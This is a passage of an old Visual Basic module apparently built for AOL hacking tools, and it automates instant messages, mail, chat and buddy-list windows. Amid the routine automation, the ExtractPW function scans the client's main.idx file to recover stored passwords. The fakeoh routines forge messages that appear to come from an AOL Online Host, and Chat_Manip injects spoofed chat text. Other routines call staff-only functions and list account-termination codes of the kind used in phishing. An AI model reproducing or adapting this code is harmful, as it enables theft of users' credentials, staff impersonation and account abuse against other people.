b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
pause .5
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
timeout (.3)
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOLVersion() = 25 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
c = sendmessagebystring(b, WM_SETTEXT, 0, who)
cl = getnextwindow(b, 2)
c = sendmessagebystring(cl, WM_SETTEXT, 0, Message) 'Put msg in



d = findchildbyclass(x, "_AOL_Button")  'Find one of the
            'buttons

x = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)

timeout .5
    Offf% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Offf%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)

Exit Sub
End If

End Sub

Sub aolsendimx (who, Message)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
timeout (.1)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
End Sub

Sub aolsendmail (person, subject, Message)

'Opens an AOL Mail and fills it out to PERSON, with a
'subject of SUBJECT, and a message of MESSAGE.
'*****THIS DOES NOT SEND THE MAIL  !! ******

AOL% = findwindow("AOL Frame25", 0&)
If AOL% = 1 Then
        msg = msg & "Please Sign On First"
        response = MsgBox(msg, 47)
    
    Exit Sub
End If
Call RunMenuByString(AOL%, "Compose Mail")

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And Mess% <> 0 Then Exit Do
Loop

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, person)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, Message)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
subcd0 (.5)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)

'AOLIcon (icone%)

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
erro% = findchildbytitle(MDI%, "Error")
aolw% = findwindow("#32770", "America Online")
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
a = SendMessage(aolw%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop

End Sub

Function AOLVersion ()
Num = 1

TOO% = findchildbyclass(aolwin(), "AOL Toolbar")
ICC% = findchildbyclass(TOO%, "_AOL_Icon")
Do
c% = DoEvents()
ICC% = GetWindow(ICC%, GW_HWNDNEXT)
Num = Num + 1
Loop Until ICC% = 0
Select Case Num
Case 19
XE = AolModule()
If FileLen(XE) > 25000 Then
AOLVersion = 95
Else
AOLVersion = 30
End If
Case 21
AOLVersion = 25
End Select

End Function

Function aolwin ()
aolwin = findwindow("AOL Frame25", 0&)
End Function

Sub ARCSendIM (who, Message)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
pause .5
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
timeout (.3)
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
End Sub

Sub Available (who)
aolver = AOLVersion()
If aolver = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = ""
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(n, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(n, WM_LBUTTONUP, 0, 0&)
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If aolver = 25 Then
Call Available25(who)
Exit Sub
End If

End Sub

Sub Available25 (who)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
What = ""
cl = getnextwindow(b, 2)
c = sendmessagebystring(cl, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_Button")  'Find one of the
            'buttons
dd = findchildbytitle(bye, "Available?")
x = sendmessagebynum(dd, WM_LBUTTONDOWN, 0, 0&) 'Click send
'pause .5
x = sendmessagebynum(dd, WM_LBUTTONUP, 0, 0&)
timeout (.5)
CloseWin (bye)
End Sub

Sub BuddyChat (txt, room)
AOL% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDI% = findchildbyclass(AOL%, "MDIClient")
wind% = findchildbytitle(AOL%, "Buddy Chat")
Label% = findchildbyclass(AOL%, "_AOL_Static")
send% = findchildbyclass(wind%, "_AOL_ICON")
EDT% = findchildbyclass(wind%, "_AOL_EDIT")  'Find the edit screen to
kw = txt
setex = sendmessagebystring(EDT%, WM_SETTEXT, 0, kw) 'Put our KW in.
settx = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
kws = room
buttonup% = sendmessagebynum(send%, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
buttondw% = sendmessagebynum(send%, WM_LBUTTONUP, 0, 0&)   'Up Click

End Sub

Sub buddyview ()
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
Win3% = getnextwindow(Win2%, 2)
buttonupp% = sendmessagebynum(Win3%, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
buttondww% = sendmessagebynum(Win3%, WM_LBUTTONUP, 0, 0&)   'Up Click
End Sub

Sub BuddyView3 ()
keywords "buddyview"
On Error Resume Next
timeout (.9)
aol1% = findwindow("AOL Frame25", 0&)  'Find the AOL Window
MDII% = findchildbyclass(aol1%, "MDIClient")
wind0% = findchildbytitle(aol1%, "Buddy List")
sendd% = findchildbyclass(wind0%, "_AOL_ICON")
Win1% = getnextwindow(sendd%, 2)
Win2% = getnextwindow(Win1%, 2)
buttonupp% = sendmessagebynum(Win2%, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
buttondww% = sendmessagebynum(Win2%, WM_LBUTTONUP, 0, 0&)   'Up Click
timeout (.9)
timeout (.4)
AppActivate "america online"
SendKeys "{tab}"
SendKeys " "
timeout (.9)
timeout (.4)
End Sub

Sub Bump (person, Message)
invokes "40-007669"
timeout (.5)
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, "Untitled")
'bump1 = findchildbytitle(b, "Bump Message")
c = findchildbyclass(b, "_AOL_EDIT") 'Put the SN in the IM
ac = sendmessagebystring(c, WM_SETTEXT, 0, person)
next1 = getnextwindow(c, 2)
next2 = getnextwindow(next1, 2)
next3 = getnextwindow(next2, 2)
next4 = getnextwindow(next3, 2)
c = sendmessagebystring(next4, WM_SETTEXT, 0, Message)
Button = findchildbytitle(b, "Bump Account")
click (Button)
Call AOLCloseMsg
CloseWin (b)

End Sub

Sub bumptxt (Message$)
signedon = Online()
If signedon = True Then
Entr = CStr(Chr(13) & Chr(10))
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "&Sign Off")
Do: DoEvents
x = findchildbytitle(a, "Goodbye from America Online!") 'Find IM
x1 = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Entr + Entr + Entr + Entr
What2 = Message$ + Entr + Entr + Entr + Entr + Entr + Entr

x2 = getnextwindow(x1, 2)
c = sendmessagebystring(x1, WM_SETTEXT, 0, what1) 'Put msg in
d = sendmessagebystring(x2, WM_SETTEXT, 0, What2)
Loop Until x <> 0
Exit Sub
End If

End Sub

Sub centerform (F As Form)
F.Top = (Screen.Height * .85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2

End Sub

 Sub ChangeFile (Fname, IdString, NString)
    GoTo hangman6

CFileErr:
    MsgBox "An error has occured, cannot continue. /*CF error - Most likely incorrect AOL directory specified*/"
    Close
    Exit Sub

hangman6:
    On Error GoTo CFileErr

    Dim PosString As Long, WhereString As Long
    Dim FileNumber As Long, a$, NewString$


    FileNumber = FreeFile
    PosString = 1
    WhereString = 0
    AString = Space$(ChunkSize)


    If Len(IdString) > Len(NString) Then
      NewString = NString + Space$(Len(IdString) - Len(NString))
    Else
      NewString = Left$(NString, Len(IdString))
    End If

    Open Fname For Binary As FileNumber
    If LOF(FileNumber) < ChunkSize Then
      a$ = Space$(LOF(FileNumber))
      Get #FileNumber, 1, a$
      WhereString = InStr(1, AString, IdString)

    Else
      Get #FileNumber, 1, AString
      WhereString = InStr(1, AString, IdString)

    End If


    If WhereString <> 0 Then
      Put #FileNumber, WhereString, NewString$
    End If
    PosString = ChunkSize + PosString - Len(IdString)


    Do Until EOF(FileNumber) Or PosString > LOF(FileNumber)
      If PosString + ChunkSize > LOF(FileNumber) Then
        a$ = Space$(LOF(FileNumber) - PosString)
        Get #FileNumber, PosString, a$
        WhereString = InStr(1, AString, IdString)
      Else
        Get #FileNumber, PosString, AString
        WhereString = InStr(1, AString, IdString)
      End If
      If WhereString <> 0 Then
        Put #FileNumber, PosString + WhereString - 1, NewString$
      End If
      PosString = ChunkSize + PosString - Len(IdString)

    Loop
    Close




End Sub

Function Chat_Find ()
AOL = findwindow("AOL Frame25", 0&)
If AOL = 0 Then Exit Function
b = findchildbyclass(AOL, "AOL Child")

Start1:
c = findchildbyclass(b, "_AOL_VIEW")
If c = 0 Then GoTo nextwnd1
d = findchildbyclass(b, "_AOL_EDIT")
If d = 0 Then GoTo nextwnd1
e = findchildbyclass(b, "_AOL_LISTBOX")
If e = 0 Then GoTo nextwnd1
'We've found it
Chat_Find = b
Exit Function

nextwnd1:
b = getnextwindow(b, 2)
If b = GetWindow(b, GW_HWNDLAST) Then Exit Function
GoTo Start1

End Function

Sub Chat_Hide ()
b = ShowWindow(findchatroom(), SW_Hide)

End Sub

Sub Chat_LagProtect ()
b = findchildbyclass(findchatroom(), "_AOL_View")
x = ShowWindow(b, SW_Hide)

End Sub

Sub Chat_Manip (txt)
x = findsn() 'Calls our custon get Screen Name Function
name1 = x
Mess = txt
View% = findchildbyclass(findchatroom(), "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & name1 + ":" & Chr(9) & Mess)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub Chat_Send (txt)
DoEvents
AOLEdit% = findchildbyclass(findchatroom(), "_AOL_Edit")
Call SetEdit(AOLEdit%, txt)
Call Enter(AOLEdit%)
DoEvents

End Sub

Sub Chat_Show ()
b = ShowWindow(findchatroom(), SW_Show)
End Sub

Sub Chat_UnLagProtect ()
b = findchildbyclass(findchatroom(), "_AOL_View")
x = ShowWindow(b, SW_Hide)

End Sub

Function Chat_View ()
a = findchildbyclass(Chat_Find(), "_AOL_View")
Chat_View = a
End Function

Sub Check_Internal ()
keywords "Fone"
Do: DoEvents
a = findwindow("AOL Frame25", 0&)  'Find AOL
b = findchildbytitle(a, "Phone Directory") 'Find IM
nofound = findchildbytitle(a, "Keyword Not Found")
If nofound <> 0 Then : CloseWin (nofound): sendtag "Internal: No": MsgBox "Your Not On An Internal", 59: Exit Do
Loop Until b <> 0
If b <> 0 Then
CloseWin (b)
sendtag "Internal: Yes"
MsgBox "Your On An Internal", 59
Exit Sub
End If

End Sub

Sub Check_OH ()
keywords "ARC"
Do: DoEvents
a = findwindow("AOL Frame25", 0&)  'Find AOL
b = findchildbytitle(a, "NEW ARC") 'Find IM
nofound = findchildbytitle(a, "Keywords Found")
If nofound <> 0 Then : CloseWin (nofound): sendtag "OH: No": MsgBox "Your Not On An OH", 59: Exit Do
Loop Until b <> 0
If b <> 0 Then
CloseWin (b)
sendtag "OH: Yes"
MsgBox "Your On An OH", 59
Exit Sub
End If

End Sub

Sub click (send%)
DoEvents
x = sendmessagebynum(send%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(send%, WM_LBUTTONUP, 0, 0&)
DoEvents
End Sub

Sub ClickChatIcon ()
AOL% = findwindow("AOL Frame25", 0&) 'finds AOL
MDI% = findchildbyclass(AOL%, "MDIClient")
NER% = findchildbytitle(MDI%, "New Mail") 'finds new mail
TOO% = findchildbyclass(AOL%, "AOL Toolbar") 'finds the toolbar
NEE% = findchildbyclass(TOO%, "_AOL_Icon")
stop0% = getnextwindow(NEE%, GW_HWNDNEXT)
stop1% = getnextwindow(stop0%, GW_HWNDNEXT)
stop2% = getnextwindow(stop1%, GW_HWNDNEXT)
stop3% = getnextwindow(stop2%, GW_HWNDNEXT)
d = sendmessagebynum(stop3%, WM_LBUTTONDOWN, 0, 0) 'clicks on new mail
d = sendmessagebynum(stop3%, WM_LBUTTONUP, 0, 0)
End Sub

Sub ClickForward ()
a = findwindow("AOL Frame25", 0&)  'Find AOL
forward = findchildbytitle(a, "Forward")
b = findchildbyclass(a, "AOL Toolbar") 'Find msg area
c = findchildbyclass(a, "_AOL_ICON")  'Find one of the
ENDZ = GetWindow(c, GW_HWNDNEXT)
    RLA = findchildbytitle(findfwdwin(), "Forward")
    ENDZ = GetWindow(RLA, GW_HWNDNEXT)
   timeout (.01)
    click (ENDZ)

End Sub

Sub ClickMailKeepAsNew ()
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
WEL% = findchildbytitle(MDI%, "Welcome, ")
NMB% = findchildbytitle(MDI%, "New Mail")
TREE% = findchildbyclass(NMB%, "_AOL_Tree")
Nummailz = sendmessagebynum(TREE%, LB_GETCOUNT, 0, 0&)
RED% = findchildbytitle(NMB%, "Keep As New")
click (RED%)

End Sub

Sub clickmailread ()
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
WEL% = findchildbytitle(MDI%, "Welcome, ")
NMB% = findchildbytitle(MDI%, "New Mail")
TREE% = findchildbyclass(NMB%, "_AOL_Tree")
Nummailz = sendmessagebynum(TREE%, LB_GETCOUNT, 0, 0&)
RED% = findchildbytitle(NMB%, "Read")
click (RED%)

End Sub

Sub ClickNext ()
a = findwindow("AOL Frame25", 0&)  'Find AOL
forward = findchildbytitle(a, "Forward")
b = findchildbyclass(a, "AOL Toolbar") 'Find msg area
c = findchildbyclass(a, "_AOL_ICON")  'Find one of the
c1 = GetWindow(c, GW_HWNDNEXT)
c2 = GetWindow(c1, GW_HWNDNEXT)
c3 = GetWindow(c2, GW_HWNDNEXT)
'RLA = findchildbytitle(findfwdwin(), "Forward")
click (c3)

End Sub

Sub CloseWin (HAN%)
Dim XZ%
XZ% = SendMessage(HAN%, WM_CLOSE, 0, 0)
End Sub

Function Countmail () As Integer
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
NMB% = findchildbytitle(MDI%, "New Mail")
TREE% = findchildbyclass(NMB%, "_AOL_Tree")
Nummailz = sendmessagebynum(TREE%, LB_GETCOUNT, 0, 0&)
Countmail = Nummailz
End Function

Sub countnewmail ()
'Counts your new mail...Mail doesn't have to be open

a = findwindow("AOL Frame25", 0&)
Call RunMenuByString(a, "Read &New Mail")

AO% = findwindow("AOL Frame25", 0&)
Do: DoEvents
arf = findchildbytitle(AO%, "New Mail")
If arf <> 0 Then Exit Do
Loop


Hand% = findchildbyclass(arf, "_AOL_TREE")
buffer = sendmessagebynum(Hand%, LB_GETCOUNT, 0, 0)
If buffer > 1 Then
MsgBox "You have " & buffer & " messages in your E-Mailbox."
End If
If buffer = 1 Then
MsgBox "You have one message in your E-Mailbox."
End If
If buffer < 1 Then
MsgBox "You have zero messages in your E-Mailbox"
End If

End Sub

Sub Cris_Code (List As ListBox)
List.AddItem "CAN250 - Egregious Abuse/Fake Report/Dup Account"
List.AddItem "CAN251 - Fraudulent Account Info/Creation"
List.AddItem "CAN252 - Password Solicitation"
List.AddItem "CAN253 - Staff Impersonation"
List.AddItem "CAN254 - Mail Bombing"
List.AddItem "CAN255 - Illegal Web/FTP"
List.AddItem "CAN256 - Transfer: Graphics 01"
List.AddItem "CAN257 - Transfer: Virus"
List.AddItem "CAN258 - Transfer: Copyrighted Software (CopySoft)"
List.AddItem "CAN259 - Transfer: Hackware (AOHell"
List.AddItem "etc.)"
List.AddItem "CAN260 - Physical Threat"
List.AddItem "CAN261 - Use of Hackware (AOHell"
List.AddItem "etc.)"
List.AddItem "CAN264 - Employee Termination - Standing 01"
List.AddItem "CAN270 - Invalid Account Information"
List.AddItem "CAN271 - Vulgarity"
List.AddItem "CAN272 - Sexually Explicit"
List.AddItem "CAN273 - Scrolling"
List.AddItem "CAN274 - Disruption (room and Board)"
List.AddItem "CAN275 - Malicious Mischief"
List.AddItem "CAN276 - Harassment"
List.AddItem "CAN277 - Chain Letters"
List.AddItem "CAN278 - Unacceptable Discussion"
List.AddItem "CAN279 - Unsolicited Advertising/Mass Mailing"
List.AddItem "CAN280 - IRC Abuse/Hacking"
List.AddItem "CAN281 - Member Impersonation"
List.AddItem "CAN282 - Unacceptable Screen Name"
List.AddItem "CAN283 - Unacceptable Profile"
List.AddItem "CAN284 - Unacceptable Webpage/ftp"
List.AddItem "CAN285 - Games lock out/termination"
List.AddItem "CAN286 - Creation of Vulgar Room Name"
List.AddItem "CAN287 - Transfer: Graphics 02"

End Sub

Sub Desktop_Hide ()
a = findwindow("Shell_TrayWnd", 0&)
    x = ShowWindow(a, SW_Hide)

End Sub

Sub Desktop_Show ()
a = findwindow("Shell_TrayWnd", 0&)
    x = ShowWindow(a, SW_Show)

End Sub

Sub disableaolwins ()
'Enables all AOL Child Windows

Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 0)

fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 0)
faa = fc

Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 0)
DoEvents
Loop Until faf = faa

End Sub

' Force all runtime errors to be handled here.
Sub DisplayErrorMessageBox ()
    Select Case Err
        Case MCIERR_CANNOT_LOAD_DRIVER
            msg$ = "Error load media device driver."
        Case MCIERR_DEVICE_OPEN
            msg$ = "The device is not open or is not known."
        Case MCIERR_INVALID_DEVICE_ID
            msg$ = "Invalid device id."
        Case MCIERR_INVALID_FILE
            msg$ = "Invalid filename."
        Case MCIERR_UNSUPPORTED_FUNCTION
            msg$ = "Action not available for this device."
        Case Else
            msg$ = "Unknown error (" + Str$(Err) + ")."
    End Select

    MsgBox msg$, 48, MCI_APP_TITLE
End Sub

Sub Do3d (obj As Control, Style%, Thick%)
obj.Parent.AutoRedraw = True
    If Thick <= 0 Then Thick = 1
    If Thick > 8 Then Thick = 8
    OldMode = obj.Parent.ScaleMode
    OldWidth = obj.Parent.DrawWidth
    obj.Parent.ScaleMode = 3
    obj.Parent.DrawWidth = 1
    ObjHeight = obj.Height
    ObjWidth = obj.Width
    ObjLeft = obj.Left
    ObjTop = obj.Top
    
    Select Case Style
        Case 1:
            TLshade = QBColor(8)
            BRshade = QBColor(15)
        Case 2:
            TLshade = QBColor(15)
            BRshade = QBColor(8)
        Case 3:
            TLshade = RGB(0, 0, 255)
            BRshade = QBColor(1)
    End Select
        For i = 1 To Thick
            CurLeft = ObjLeft - i
            CurTop = ObjTop - i
            CurWide = ObjWidth + (i * 2) - 1
            CurHigh = ObjHeight + (i * 2) - 1
            obj.Parent.Line (CurLeft, CurTop)-Step(CurWide, 0), TLshade
            obj.Parent.Line -Step(0, CurHigh), BRshade
            obj.Parent.Line -Step(-CurWide, 0), BRshade
            obj.Parent.Line -Step(0, -CurHigh), TLshade
        Next i
        If Thick > 2 Then
            CurLeft = ObjLeft - Thick - 1
            CurTop = ObjTop - Thick - 1
            CurWide = ObjWidth + ((Thick + 1) * 2) - 1
            CurHigh = ObjHeight + ((Thick + 1) * 2) - 1
            obj.Parent.Line (CurLeft, CurTop)-Step(CurWide, 0), QBColor(0)
            obj.Parent.Line -Step(0, CurHigh), QBColor(0)
            obj.Parent.Line -Step(-CurWide, 0), QBColor(0)
            obj.Parent.Line -Step(0, -CurHigh), QBColor(0)
        End If
    obj.Parent.ScaleMode = OldMode
    obj.Parent.DrawWidth = OldWidth
End Sub

Sub enableaolwins ()
'Enables all AOL Child Windows

Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 1)

fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc

Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa
End Sub

Sub Enter (EDT%)
x = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
End Sub

Sub ErrorMsg ()
MsgBox "Error : Not Signed On!", 30
End Sub

Sub explode (Frm As Form, CFlag As Integer, Steps As Integer)
Dim FRect As RECT
Dim fWidth, FHeight As Integer
Dim i, x, y, cx, cy As Integer
Dim hScreen, Brush As Integer, OldBrush

  GetWindowRect Frm.hWnd, FRect
  fWidth = (FRect.right - FRect.Left)
  FHeight = FRect.bottom - FRect.Top
  
  hScreen = GetDC(0)
  Brush = CreateSolidBrush(0)
  OldBrush = SelectObject(hScreen, Brush)
  
  For i = 1 To Steps
    cx = fWidth * (i / Steps)
    cy = FHeight * (i / Steps)
    If CFlag Then
      x = FRect.Left + (fWidth - cx) / 2
      y = FRect.Top + (FHeight - cy) / 2
    Else
      x = FRect.Left
      y = FRect.Top
    End If
    Rectangle hScreen, x, y, x + cx, y + cy
  Next i
  
  If ReleaseDC(0, hScreen) = 0 Then
    MsgBox "Unable to Release Device Context", 16, "Device Error"
  End If
  DeleteObject (Brush)
  Frm.Show

End Sub

Sub Extend (Form As Form)
Form.Show
FHeight = Form.Height
For x = 0 To FHeight
Form.Height = x
Next x
End Sub

'
Function ExtractPW (aoldir$, ScreenName$) As String
LengthSN = Len(ScreenName)
Select Case LengthSN
Case 3
NumSpaces = ScreenName + "       "
Case 4
NumSpaces = ScreenName + "      "
Case 5
NumSpaces = ScreenName + "     "
Case 6
NumSpaces = ScreenName + "    "
Case 7
NumSpaces = ScreenName + "   "
Case 8
NumSpaces = ScreenName + "  "
Case 9
NumSpaces = ScreenName + " "
Case 10
NumSpaces = ScreenName
End Select
BytesRead = 1
Do Until 2 > 3
pw$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Function
pw$ = String(32000, 0)
Get #1, BytesRead, pw$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
WherePW = InStr(1, pw$, NumSpaces + Chr(0), 1)
If WherePW Then
40 :
DoEvents
Mid(pw$, WherePW) = "Pass Word "

MidSN = Mid(pw$, WherePW + Len(NumSpaces) + 1, 8)
MidSN = FixAPIString(MidSN)
MidPW = Mid(pw$, WherePW + Len(NumSpaces) + 1 + Len(MidSN), 1)
If MidPW <> Chr(0) Then GoTo 45
If Len(MidSN) < 4 Then GoTo 45
If Len(MidSN) = "" Then GoTo 45
ExtractPW = MidSN
45 :
WherePW = InStr(1, pw$, NumSpaces + Chr(0), 1)
If WherePW Then DoEvents: GoTo 40
End If
BytesRead = BytesRead + 32000
FileLength = LOF(2)
Close #2
If BytesRead > FileLength Then GoTo 30
Loop
30 :
End Function

Sub Fade (Form As Form)
'Form.AutoRedraw = True
'Dim I
'Form.Cls
'Form.ScaleHeight = 128
'For I = 0 To 126 Step 2
'Line (0, I)-(Form.ScaleWidth, I + 2), RGB(I, 64 + I, 128 + I), BF
'Next I

End Sub

Sub fakeoh (ByVal txt As String)
Dim a As String
Dim b As String
Dim c As String
a$ = txt$
c$ = txt$
b$ = String(Val(116 - Len(a$)), Chr(4))
sendchat (a$ & b$ & c$ & b$)
a$ = txt$
c$ = txt$
b$ = String(Val(116 - Len(a$)), Chr(4))
sendchat (a$ & b$ & c$ & b$)
subcd0 (.01)
a$ = txt$
c$ = txt$
b$ = String(Val(116 - Len(a$)), Chr(4))
sendchat (a$ & b$ & c$ & b$)
subcd0 (.01)
a$ = txt$
c$ = txt$
b$ = String(Val(116 - Len(a$)), Chr(4))
sendchat (a$ & b$ & c$ & b$)
subcd0 (.01)

End Sub

Sub FakeOH1 (txt1, txt2)
Dim a As String
Dim b As String
Dim c As String
a$ = txt1
c$ = txt2
b$ = String(Val(116 - Len(a$)), Chr(4))
sendchat (a$ & b$ & c$ & b$)

End Sub

Sub File_Delete (file)
On Error Resume Next
Kill file
End Sub

Sub File_MakeDir (dire)
On Error Resume Next
MkDir dire
End Sub

Sub File_RemoveDir (dire)
On Error Resume Next
RmDir dire
End Sub

Sub File_Run (exe)
On Error Resume Next
x = Shell(exe, 1)
End Sub

Function findchatroom ()
'Finds the handle of the AOL Chatroom by looking for a
'Window with a ListBox (Chat ScreenNames), Edit Box,
